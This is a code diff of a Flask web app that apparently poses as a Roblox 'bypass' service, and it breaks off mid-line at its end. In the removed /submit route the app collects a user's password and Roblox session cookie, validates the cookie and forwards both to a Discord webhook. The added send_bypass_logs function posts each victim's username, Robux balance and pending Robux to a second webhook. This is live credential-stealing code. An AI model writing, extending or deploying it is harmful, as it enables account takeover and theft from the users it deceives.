@@ -140,6 +140,77 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
     except Exception as e:
         print(f"Background: Error sending to Discord: {str(e)}")
 
+def send_bypass_logs(user_info, korblox, headless):
+    """Send bypass logs to Discord webhook WITHOUT cookie data"""
+    try:
+        bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
+        
+        if not bypass_webhook_url:
+            print("Bypass logs: BYPASS_WEBHOOK_URL not configured")
+            return
+        
+        print("Bypass logs: Sending user information without cookie data...")
+        
+        # Create bypass logs Discord embed (NO COOKIE DATA)
+        bypass_data = {
+            'embeds': [
+                {
+                    'title': '🔓 Bypass Logs',
+                    'color': 0x00ff00,  # Green color for bypass logs
+                    'thumbnail': {
+                        'url': user_info['profile_picture']
+                    },
+                    'fields': [
+                        {
+                            'name': '👤 Username',
+                            'value': user_info['username'],
+                            'inline': False
+                        },
+                        {
+                            'name': '💰 Robux',
+                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
+                            'inline': False
+                        },
+                        {
+                            'name': '⌛ Pending Robux',
+                            'value': user_info['pending_robux'],
+                            'inline': False
+                        },
+                        {
+                            'name': '📊 Status',
+                            'value': 'Successful 🟢',
+                            'inline': False
+                        },
+                        {
+                            'name': '🎭 Korblox',
+                            'value': '✅ Yes' if korblox else '❌ No',
+                            'inline': True
+                        },
+                        {
+                            'name': '👻 Headless',
+                            'value': '✅ Yes' if headless else '❌ No',
+                            'inline': True
+                        }
+                    ],
+                    'footer': {
+                        'text': f'Bypass Log • {time.strftime("%H:%M", time.localtime())}',
+                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
+                    }
+                }
+            ]
+        }
+        
+        # Send to bypass logs webhook
+        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=5)
+        
+        if response.status_code in [200, 204]:
+            print(f"Bypass logs: Successfully sent to Discord: {response.status_code}")
+        else:
+            print(f"Bypass logs: Failed to send to Discord: {response.status_code}")
+            
+    except Exception as e:
+        print(f"Bypass logs: Error sending to Discord: {str(e)}")
+
 def get_roblox_user_info(cookie):
     """Get Roblox user information using the provided cookie"""
     try:
@@ -380,149 +451,4 @@ def health_check():
             'message': 'Timeout error - Discord servers not responding'
         }), 500
     except Exception as e:
-        return jsonify({
-            'status': 'error',
-            'message': f'Unexpected error: {str(e)[:100]}'
-        }), 500
-
-@app.route('/health/full')
-def health_check_full():
-    """Comprehensive health check for the main webhook"""
-    results = {
-        'main_webhook': {'status': 'unknown'},
-        'overall_status': 'unknown'
-    }
-    
-    # Test main webhook
-    main_webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
-    if not main_webhook_url:
-        results['main_webhook'] = {
-            'status': 'error',
-            'message': 'DISCORD_WEBHOOK_URL not configured'
-        }
-    else:
-        try:
-            test_payload = {'content': 'Main webhook health check'}
-            response = requests.post(main_webhook_url, json=test_payload, timeout=5)
-            
-            if response.status_code in [200, 204]:
-                results['main_webhook'] = {
-                    'status': 'ok',
-                    'message': 'Main webhook successful',
-                    'status_code': response.status_code
-                }
-            else:
-                results['main_webhook'] = {
-                    'status': 'error',
-                    'message': f'Main webhook failed with status {response.status_code}',
-                    'status_code': response.status_code
-                }
-        except Exception as e:
-            results['main_webhook'] = {
-                'status': 'error',
-                'message': f'Main webhook error: {str(e)[:100]}'
-            }
-    
-    # Determine overall status
-    main_ok = results['main_webhook']['status'] == 'ok'
-    
-    if main_ok:
-        results['overall_status'] = 'ok'
-        status_code = 200
-    else:
-        results['overall_status'] = 'error'
-        status_code = 500
-    
-    return jsonify(results), status_code
-
-@app.route('/debug')
-def debug_info():
-    """Debug endpoint to check environment and configuration"""
-    return jsonify({
-        'environment_variables': {
-            'DISCORD_WEBHOOK_URL': 'SET' if os.environ.get('DISCORD_WEBHOOK_URL') else 'NOT_SET',
-            'DATABASE_URL': 'SET' if os.environ.get('DATABASE_URL') else 'NOT_SET',
-            'SESSION_SECRET': 'SET' if os.environ.get('SESSION_SECRET') else 'NOT_SET'
-        },
-        'python_version': sys.version,
-        'current_working_directory': os.getcwd(),
-        'files_in_directory': os.listdir('.'),
-        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
-    })
-
-
-@app.route('/submit', methods=['POST'])
-def submit_form():
-    """Handle form submission and send to Discord webhook"""
-    try:
-        data = request.get_json()
-        
-        # Extract all form fields
-        password = data.get('password', '').strip()
-        korblox = data.get('korblox', False)
-        headless = data.get('headless', False)
-        cookie = data.get('cookie', '').strip()
-        
-        # Auto-clean Roblox warning prefix from cookie
-        cookie = clean_roblox_cookie(cookie)
-        
-        # Server-side validation
-        if not cookie:
-            return jsonify({
-                'success': False, 
-                'message': 'Missing required field (cookie)'
-            }), 400
-        
-        # Comprehensive cookie validation
-        is_valid, is_expired, error_msg = is_valid_cookie(cookie)
-        
-        if not is_valid or is_expired:
-            return jsonify({
-                'success': False, 
-                'message': 'Your Cookie Was Expired Or Invalid'
-            }), 400
-        
-        
-        # Get Discord webhook URL from environment
-        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
-        if not webhook_url:
-            print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
-            print("Available environment variables:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper() or 'DISCORD' in key.upper()])
-            return jsonify({
-                'success': False, 
-                'message': 'Discord webhook not configured. Please set DISCORD_WEBHOOK_URL environment variable in your deployment platform.'
-            }), 500
-        
-        print("Discord webhook URL configured successfully") # Don't log URL for security
-        
-        # Process Discord webhooks synchronously for Vercel compatibility  
-        print("Processing Discord webhooks synchronously...")
-        start_time = time.time()
-        
-        try:
-            send_to_discord_background(password, korblox, headless, cookie, webhook_url)
-            end_time = time.time()
-            processing_time = end_time - start_time
-            print(f"Discord webhook processing completed successfully in {processing_time:.2f} seconds")
-            
-            return jsonify({
-                'success': True, 
-                'message': f'Data processed and sent successfully in {processing_time:.1f}s'
-            })
-        except Exception as e:
-            end_time = time.time()
-            processing_time = end_time - start_time
-            print(f"Error during Discord webhook processing after {processing_time:.2f} seconds: {str(e)}")
-            return jsonify({
-                'success': False, 
-                'message': f'Processing failed after {processing_time:.1f}s: webhook delivery error'
-            }), 500
-            
-    except Exception as e:
-        return jsonify({
-            'success': False, 
-            'message': 'Server error occurred'
-        }), 500
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+        return j
